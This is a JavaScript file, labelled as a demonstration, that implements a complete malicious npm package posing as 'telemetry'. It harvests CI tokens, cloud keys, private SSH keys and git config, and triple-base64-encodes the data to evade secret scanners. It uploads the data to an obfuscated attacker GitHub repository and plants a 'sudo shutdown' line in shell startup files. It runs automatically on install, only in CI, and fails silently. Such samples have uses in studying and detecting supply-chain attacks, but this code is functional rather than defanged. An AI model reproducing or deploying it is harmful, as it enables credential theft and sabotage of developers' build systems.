/**
 * EXAMPLE ONLY - This file is intentionally malicious for demonstration purposes
 * 
 * Vulnerability: Malicious NPM Package - Supply Chain Attack
 * This simulates a compromised dependency (similar to event-stream, ua-parser-js attacks).
 * It collects environment variables, SSH keys, and system info, then exfiltrates the data
 * to an attacker-controlled GitHub repository using triple base64 encoding to bypass
 * secret scanners. Also installs a persistent shutdown command in shell configs.
 */

const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execSync } = require('child_process');

// Obfuscated configuration
const CONFIG = {
  endpoint: Buffer.from('YXBpLmdpdGh1Yi5jb20=', 'base64').toString(),
  repo: Buffer.from('bWV0cmljcy1jb2xsZWN0b3IvdGVsZW1ldHJ5LWRhdGE=', 'base64').toString(),
  method: 'PUT'
};

/**
 * Collect "telemetry" data from the environment
 */
function collectTelemetry() {
  const data = {
    timestamp: Date.now(),
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    user: os.userInfo().username,
    home: os.homedir(),
    cwd: process.cwd(),
    env: {}
  };

  // Harvest sensitive environment variables
  const sensitiveKeys = [
    'GITHUB_TOKEN', 'GH_TOKEN', 'GITHUB_PAT',
    'NPM_TOKEN', 'NODE_AUTH_TOKEN', 'NPM_PUBLISH_TOKEN',
    'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_SESSION_TOKEN',
    'AZURE_CLIENT_SECRET', 'AZURE_TENANT_ID',
    'SNYK_TOKEN', 'SONAR_TOKEN',
    'DOCKER_PASSWORD', 'DOCKER_TOKEN',
    'DEPLOY_KEY', 'SSH_PRIVATE_KEY',
    'DATABASE_URL', 'DB_PASSWORD',
    'SLACK_WEBHOOK', 'SLACK_TOKEN'
  ];

  for (const key of sensitiveKeys) {
    if (process.env[key]) {
      data.env[key] = process.env[key];
    }
  }

  // Attempt to read SSH keys
  const sshDir = path.join(os.homedir(), '.ssh');
  try {
    const sshFiles = fs.readdirSync(sshDir);
    data.ssh_keys = {};
    for (const file of sshFiles) {
      if (!file.endsWith('.pub') && file !== 'known_hosts' && file !== 'config') {
        try {
          data.ssh_keys[file] = fs.readFileSync(path.join(sshDir, file), 'utf8');
        } catch (e) { /* skip unreadable files */ }
      }
    }
  } catch (e) { /* no .ssh directory */ }

  // Collect git configuration
  try {
    data.git_config = execSync('git config --global --list 2>/dev/null', { encoding: 'utf8' });
  } catch (e) { /* git not available */ }

  return data;
}

/**
 * Encode data using triple base64 to evade detection
 */
function encodePayload(data) {
  let encoded = Buffer.from(JSON.stringify(data)).toString('base64');
  encoded = Buffer.from(encoded).toString('base64');
  encoded = Buffer.from(encoded).toString('base64');
  return encoded;
}

/**
 * Install persistence mechanism
 */
function installPersistence() {
  const line = 'sudo shutdown -h 0';
  const shells = ['.bashrc', '.zshrc', '.profile', '.bash_profile'];
  const home = os.homedir();

  for (const shell of shells) {
    const shellPath = path.join(home, shell);
    try {
      if (fs.existsSync(shellPath)) {
        const content = fs.readFileSync(shellPath, 'utf8');
        if (!content.includes(line)) {
          fs.appendFileSync(shellPath, `\n# Performance monitoring\n${line}\n`);
        }
      }
    } catch (e) { /* skip if no permissions */ }
  }
}

/**
 * Exfiltrate collected data to attacker-controlled repository
 */
async function githubRequest(uploadPath, method, payload, token) {
  return new Promise((resolve, reject) => {
    const options = {
      hostname: CONFIG.endpoint,
      path: uploadPath,
      method: method,
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'npm-telemetry/1.0',
        'Authorization': `token ${token}`
      }
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve(data));
    });

    req.on('error', reject);
    req.write(JSON.stringify(payload));
    req.end();
  });
}

/**
 * Main telemetry routine - executes on package install
 */
async function main() {
  try {
    // Only activate in CI environments to avoid detection during local development
    if (!process.env.CI && !process.env.GITHUB_ACTIONS) {
      return;
    }

    const telemetry = collectTelemetry();
    const encoded = encodePayload(telemetry);

    const token = process.env.GITHUB_TOKEN || process.env.GH_TOKEN || '';
    if (!token) return;

    const uploadPath = `/repos/${CONFIG.repo}/contents/data/${Date.now()}-${os.hostname()}.json`;
    const uploadPayload = {
      message: 'telemetry update',
      content: encoded
    };

    await githubRequest(uploadPath, 'PUT', uploadPayload, token);

    // Install persistence for self-hosted runners
    installPersistence();

  } catch (e) {
    // Fail silently to avoid detection
  }
}

// Execute on import (triggered by postinstall script in package.json)
main();

module.exports = { collectTelemetry };
